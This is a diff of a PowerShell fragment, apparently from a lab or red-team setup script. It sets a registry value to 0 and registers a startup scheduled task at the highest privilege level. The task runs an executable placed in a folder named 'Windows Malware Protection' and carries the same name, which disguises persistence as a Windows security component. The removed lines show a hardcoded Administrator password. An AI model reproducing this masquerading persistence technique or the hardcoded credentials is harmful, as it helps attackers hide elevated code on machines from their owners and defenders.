@@ -20,11 +20,11 @@ $value = "0"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
 
 #Create startup Task
-$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
-$Password = "Password01"
+#$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
+#$Password = "Password01"
 $triggers = @()
 $triggers += New-JobTrigger -AtStartup
 $triggers += New-JobTrigger -Once -At (Get-Date).AddMinutes(1)
 $setting = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
-Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"
+Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -TaskName "Windows Malware Protection" #-User $Username -Password $Password 
